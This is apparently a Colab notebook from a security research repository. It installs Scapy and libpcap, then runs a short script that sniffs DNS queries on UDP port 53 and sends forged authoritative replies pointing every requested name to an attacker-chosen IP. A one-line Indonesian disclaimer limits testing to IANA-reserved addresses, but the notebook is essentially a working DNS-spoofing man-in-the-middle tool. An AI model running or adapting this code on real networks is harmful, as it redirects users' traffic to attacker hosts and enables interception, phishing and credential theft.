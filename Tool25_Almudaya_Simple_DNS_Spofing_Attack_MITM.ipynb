{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPkbJ5RzUt6g+MLF026cykT",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool25_Almudaya_Simple_DNS_Spofing_Attack_MITM.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install scapy"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8c8oJOcdru0l",
        "outputId": "400886b0-d22c-4d1b-f8e6-f9f799df69f4"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: scapy in /usr/local/lib/python3.10/dist-packages (2.5.0)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Pengujian Tool ini hanya dibenarkan jika menggunakan alamat legal yang disediakan oleh IANA (Internet Assigned Numbers Authority)"
      ],
      "metadata": {
        "id": "-J8qiAtAEFZv"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install libpcap"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9sxUIaFUHQt3",
        "outputId": "ce0546e4-2b71-47cb-ded2-8b8de34c0c30"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: libpcap in /usr/local/lib/python3.10/dist-packages (1.11.0b8)\n",
            "Requirement already satisfied: setuptools>=68.2.2 in /usr/local/lib/python3.10/dist-packages (from libpcap) (70.2.0)\n",
            "Requirement already satisfied: pkg-about>=1.1.5 in /usr/local/lib/python3.10/dist-packages (from libpcap) (1.1.6)\n",
            "Requirement already satisfied: packaging>=24.1.0 in /usr/local/lib/python3.10/dist-packages (from pkg-about>=1.1.5->libpcap) (24.1)\n",
            "Requirement already satisfied: tomli>=2.0.1 in /usr/local/lib/python3.10/dist-packages (from pkg-about>=1.1.5->libpcap) (2.0.1)\n"
          ]
        }
      ]
    },
    {
      "source": [
        "!apt-get update\n",
        "!apt-get install -y libpcap-dev"
      ],
      "cell_type": "code",
      "metadata": {
        "id": "YX59OsvpH_x5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from scapy.all import *\n",
        "#import libpcap\n",
        "\n",
        "# Alamat IP dan domain target\n",
        "target_ip = \"192.168.1.5\"\n",
        "fake_ip = \"192.168.1.100\"\n",
        "domain = \"example.com\"\n",
        "\n",
        "def dns_spoof(packet):\n",
        "    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:\n",
        "        spoofed_pkt = (IP(dst=packet[IP].src, src=packet[IP].dst) /\n",
        "                       UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /\n",
        "                       DNS(id=packet[DNS].id, qd=packet[DNS].qd,\n",
        "                           aa=1, qr=1,\n",
        "                           an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)))\n",
        "        send(spoofed_pkt, verbose=0)\n",
        "\n",
        "print(\"Starting DNS spoofing...\")\n",
        "sniff(filter=\"udp port 53\", prn=dns_spoof, store=0)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mf3r4xgGHD7-",
        "outputId": "47da6a81-00e2-4727-8cc4-e8593f8f5a76"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Starting DNS spoofing...\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>"
            ]
          },
          "metadata": {},
          "execution_count": 6
        }
      ]
    }
  ]
}